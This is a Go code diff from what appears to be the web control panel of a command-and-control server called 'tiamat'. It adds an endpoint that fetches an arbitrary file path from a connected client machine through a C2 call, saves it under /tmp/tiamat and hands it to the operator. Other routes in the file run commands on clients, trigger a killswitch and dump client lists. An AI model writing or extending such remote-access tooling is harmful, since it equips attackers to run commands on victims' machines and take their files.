@@ -39,7 +39,7 @@ func WebServer() {
 	r.GET("/fs/:clientid", getFilesystem)
 	r.POST("/ls/:clientid", listFiles)
 	r.POST("/upload/:clientid", uploadFile)
-	r.GET("/download/:clientid", downloadFile)
+	r.GET("/download/:clientid/:file", downloadFile)
 	r.POST("/command/:clientid", execCMD)
 	r.POST("/kill/:clientid", sendKillswitch)
 	r.GET("/dump", dumpClients)
@@ -53,9 +53,32 @@ func WebServer() {
 }
 
 func downloadFile(c *gin.Context) {
-	// path, _ := c.GetPostForm("fileToDownload")
-	//
-	// c.FileAttachment("", "")
+	client, err := clientCheck(c)
+	if err != nil {
+		return
+	}
+
+	file := c.Param("file")
+	if file == "" {
+		return
+	}
+	path := strings.Replace(file, "_|_", "/", -1)
+
+	resp, err := downloadFileC2(client, path)
+	if err != nil {
+		e := fmt.Sprintf("Error happened executing command: %v\n", err)
+		c.String(http.StatusOK, e)
+		return
+	}
+	if resp.Successful != true {
+		e := fmt.Sprintf("Error happened executing command: %v\n", resp.Message)
+		c.String(http.StatusOK, e)
+		return
+	}
+
+	os.WriteFile("/tmp/tiamat/"+resp.FileName, resp.FileContents, 0700)
+
+	c.FileAttachment("/tmp/tiamat/"+resp.FileName, resp.FileName)
 }
 
 func clientCheck(c *gin.Context) (Client, error) {
@@ -161,8 +184,8 @@ func listFiles(c *gin.Context) {
 				client.ClientID, v.FullPath, v.Name)
 			list += entry
 		} else {
-			entry := fmt.Sprintf("<a hx-get=\"/download/%v\" hx-vals='{\"fileToDownload\": \"%v\"}' id=\"pointer\">%v</a><br>",
-				client.ClientID, v.FullPath+v.Name, v.Name)
+			entry := fmt.Sprintf("<a target=\"_blank\" href=\"/download/%v/%v\" id=\"pointer\">%v</a><br>",
+				client.ClientID, strings.Replace(v.FullPath, "/", "_|_", -1), v.Name)
 			list += entry
 		}
 	}
